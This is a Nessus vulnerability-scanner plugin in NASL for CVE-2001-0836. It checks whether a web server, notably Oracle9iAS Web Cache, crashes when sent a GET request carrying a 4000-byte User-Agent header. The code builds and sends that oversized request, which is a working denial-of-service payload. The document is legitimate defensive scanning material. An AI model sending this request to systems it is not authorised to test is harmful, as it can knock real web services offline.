#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
# 
#
# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0
# 


if(description)
{
 script_id(11069);
 script_bugtraq_id(3443, 3449, 7054);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2001-0836");
 name["english"] = "HTTP User-Agent overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid GET request with a too long User-Agent field

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long User-Agent kills the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if(http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

# NB: Need at least 4000 bytes to crash Oracle Web
# r = string("GET / HTTP/1.0\r\nUser-Agent: ", crap(4000), "\r\n\r\n");
# Nice trick from Renaud to handle HTTP/1.1 requests:
r= http_get(item:"/", port:port);
ua = egrep(pattern:"^User-Agent:", string:r);
if(ua)
 {
  r = r - ua;
 }
 
r= r - string("\r\n\r\n");
r= string(r, "\r\n", "User-Agent: ", crap(4000), "\r\n\r\n");
send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);


if (http_is_dead(port: port)) { security_hole(port);}
